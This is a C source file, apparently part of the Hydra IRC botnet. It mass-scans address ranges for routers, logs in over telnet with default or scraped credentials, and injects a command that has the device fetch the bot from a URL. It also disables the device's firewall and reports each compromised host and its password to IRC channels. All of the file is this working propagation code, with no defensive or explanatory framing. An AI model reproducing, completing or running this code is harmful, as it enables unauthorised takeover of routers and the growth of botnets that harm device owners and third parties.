/*
 * hydra_scan.c
 * questions: esaltato, <esaltato@autistici.org>.
 *
 */

#include "../include/hydra_hds.h"

/* cmd_scan_central(sock_t *, reqs_t *, unsigned short) */
/* start the selected scanner (scan=1, advscan=2).      */
void cmd_scan_central(sock_t *sp, reqs_t *req, unsigned short type)
{
	char *addr;
	int i, x;
	
	founds = 0;

	for (i = 0; i <= 255; i++)
	{
		for (x = 0; x <= 255; x++)
		{
			addr = malloc(3*6+3);
			snprintf(addr, 3*6+4, "%d.%d.%d.%d", atoi(req->rso_b), atoi(req->rso_c), i, x);
			
			if (type == 1)
			{
				if (cmd_scan_control(addr, sp, req) == 0) 
				{
					arg_send(sp->s_fd, vuln_found_scan, irc_room, addr, 
            req->rso_d, req->rso_e);
					arg_send(sp->s_fd, vuln_found_scan, irc_room_sv, addr, 
            req->rso_d, req->rso_e);
				}
			}

			else if (type == 2)
			{
				if (cmd_advscan_control(addr, sp, req) == 0) 
				{
					strncpy(psw_y, psw_x, strlen(psw_x)-2);
					arg_send(sp->s_fd, vuln_found_advscan, irc_room, addr, psw_y);
					arg_send(sp->s_fd, vuln_found_advscan, irc_room_sv, addr, psw_y);
				}
			}

			free(addr);
		}
	}

	if (type == 1)	
    arg_send(sp->s_fd, complete_scan, irc_room, founds);
	else if (type == 2)	
    arg_send(sp->s_fd, complete_advscan, irc_room, founds);

	exit(0);
}

/* __alarm()           */
/* for socket timeout. */
void __alarm() 
{
	close(scan_sp->s_fd);
	return;
}

/* cmd_scan_control(char *, sock_t *, reqs_t *) */
/* standard scanner init.                       */
int cmd_scan_control(char *addr, sock_t *sp, reqs_t *req)
{
  scan_sp = (sock_t *) malloc(sizeof(sock_t));

	scan_sp->s_hs = gethostbyname(addr);
	scan_sp->s_fd = socket(AF_INET, SOCK_STREAM, 0);

	scan_sp->s_addr.sin_family = AF_INET;
	scan_sp->s_addr.sin_port = htons(telnet_port); 
	scan_sp->s_addr.sin_addr = *((struct in_addr *)scan_sp->s_hs->h_addr);

	memset(scan_sp->s_addr.sin_zero, '\0', 
    sizeof scan_sp->s_addr.sin_zero);

	timeout_value = 1;
	tm.tv_sec = timeout_value;
	tm.tv_usec = 0;

	signal(SIGALRM, __alarm);
	alarm(timeout_value);

	if (connect(scan_sp->s_fd, (struct sockaddr *)&scan_sp->s_addr, 
    sizeof scan_sp->s_addr) == false) 
	{
		alarm(0);
		signal(SIGALRM, SIG_DFL);
    free(scan_sp);

		return EXIT_FAILURE;
	}

	recv_bytes = recv(scan_sp->s_fd, __netbuf, sizebuf-1, true);
	__netbuf[recv_bytes] = 0;

	if (strncmp(__netbuf, router_id, strlen(router_id)) != 0 
    && strchr(__netbuf, '!') != NULL)
	{
		if (cmd_scan_join(scan_sp, req) == true)
		{
			founds++;
      close(scan_sp->s_fd);
      free(scan_sp);

			return EXIT_SUCCESS;
		}
	}

	close(scan_sp->s_fd);
  free(scan_sp);

	return EXIT_FAILURE;
}

/* cmd_scan_join(sock_t *, reqs_t *)           */
/* standard scanner (router validate control). */
int cmd_scan_join(sock_t *scan_sp, reqs_t *req)
{
	if (arg_send(scan_sp->s_fd, "%s\r\n", req->rso_d) == false) 
		return EXIT_FAILURE;

	recv(scan_sp->s_fd, __netbuf, sizebuf-1, true);

	if (arg_send(scan_sp->s_fd, "%s\r\n", req->rso_e) == false) 
		return EXIT_FAILURE;

	recv(scan_sp->s_fd, __netbuf, sizebuf-1, true);

	recv_bytes = recv(scan_sp->s_fd, __netbuf, sizebuf-1, true);
	__netbuf[recv_bytes] = 0;

	if (strstr(__netbuf, "built-in commands"))
	{
		arg_send(scan_sp->s_fd, hydra_inject, 
      hydra_url, hydra_tag, hydra_tag, hydra_tag);
		arg_send(scan_sp->s_fd, stop_firewall);
		recv(scan_sp->s_fd, __netbuf, sizebuf-1, 0);

		return EXIT_SUCCESS;
	}

	return EXIT_FAILURE;
}

/* cmd_advscan_control(char *, sock_t *, reqs_t *) */
/* advance scanner init.                           */
int cmd_advscan_control(char *addr, sock_t *sp, reqs_t *req)
{
  scan_sp = (sock_t *) malloc(sizeof(sock_t));

	scan_sp->s_hs = gethostbyname(addr);
	scan_sp->s_fd = socket(AF_INET, SOCK_STREAM, 0);

	scan_sp->s_addr.sin_family = AF_INET;
	scan_sp->s_addr.sin_port = htons(http_port); 
	scan_sp->s_addr.sin_addr = *((struct in_addr *)scan_sp->s_hs->h_addr);

	memset(scan_sp->s_addr.sin_zero, '\0', 
    sizeof scan_sp->s_addr.sin_zero);

	timeout_value = 1;
	tm.tv_sec = timeout_value;
	tm.tv_usec = 0;
	  
	signal(SIGALRM, __alarm);
	alarm(timeout_value);

	if (connect(scan_sp->s_fd, (struct sockaddr *)&scan_sp->s_addr, 
    sizeof scan_sp->s_addr) == false) 
	{
		alarm(0);
		signal(SIGALRM, SIG_DFL);
    free(scan_sp);

		return EXIT_FAILURE;
	}

  if (cmd_advscan_getpass(scan_sp) == true)
  {
    close(scan_sp->s_fd);
    if (cmd_advscan_join(addr, sp, req) == true)
    {
      founds++;
      close(scan_sp->s_fd);

      return EXIT_SUCCESS;
    }
  }

	return EXIT_FAILURE;
}

/* cmd_advscan_getpass(sock_t *)    */
/* advance scanner password finder. */
int cmd_advscan_getpass(sock_t *scan_sp)
{
  char temp[801];
  char *one, *two;

	if(arg_send(scan_sp->s_fd, post_request) == false) 
    return EXIT_FAILURE;

	recv(scan_sp->s_fd, temp, 100, 0);
	recv(scan_sp->s_fd, temp, 800, 0);

	one = strtok(temp, "<");

	while(one != NULL)
	{
		if(strstr(one, "password>"))
		{
			two = strtok(one, ">");

			while(two != NULL)
			{
				if(strcmp(two, "password") != true)
				{
					snprintf(psw_x, strlen(two)+3, "%s\r\n", two);
					return EXIT_SUCCESS;
				}

				two = strtok(NULL, ">");
			}
		}

		one = strtok(NULL, "<");
	}

	return EXIT_FAILURE;
}

/* cmd_advscan_join(char *, sock_t *, reqs_t *) */
/* advance scanner (router validate control).   */
int cmd_advscan_join(char *addr, sock_t *sp, reqs_t *req)
{
  scan_sp = (sock_t *) malloc(sizeof(sock_t));

	scan_sp->s_hs = gethostbyname(addr);
	scan_sp->s_fd = socket(AF_INET, SOCK_STREAM, 0);

	scan_sp->s_addr.sin_family = AF_INET;
	scan_sp->s_addr.sin_port = htons(telnet_port); 
	scan_sp->s_addr.sin_addr = *((struct in_addr *)scan_sp->s_hs->h_addr);

	memset(scan_sp->s_addr.sin_zero, '\0', 
    sizeof scan_sp->s_addr.sin_zero);

	timeout_value = 1;
	tm.tv_sec = timeout_value;
	tm.tv_usec = 0;
	  
	signal(SIGALRM, __alarm);
	alarm(timeout_value);

	if (connect(scan_sp->s_fd, (struct sockaddr *)&scan_sp->s_addr, 
    sizeof scan_sp->s_addr) == false) 
	{
		alarm(0);
		signal(SIGALRM, SIG_DFL);
    free(scan_sp);

		return EXIT_FAILURE;
	}

	if (send(scan_sp->s_fd, "root\r\n", strlen("root\r\n"), 0) == false) 
    return EXIT_FAILURE;

	recv(scan_sp->s_fd, __netbuf, sizebuf-1, 0);
	send(scan_sp->s_fd, psw_x, strlen(psw_x), 0);
	recv(scan_sp->s_fd, __netbuf, sizebuf-1, 0);

	recv_bytes = recv(scan_sp->s_fd, __netbuf, sizebuf-1, 0);
	__netbuf[recv_bytes] = 0;

	if (strstr(__netbuf, "built-in commands"))
	{
		arg_send(scan_sp->s_fd, hydra_inject, 
      hydra_url, hydra_tag, hydra_tag, hydra_tag);
		arg_send(scan_sp->s_fd, stop_firewall);
		recv(scan_sp->s_fd, __netbuf, sizebuf-1, 0);

		return EXIT_SUCCESS;
	}

	return EXIT_FAILURE;
}
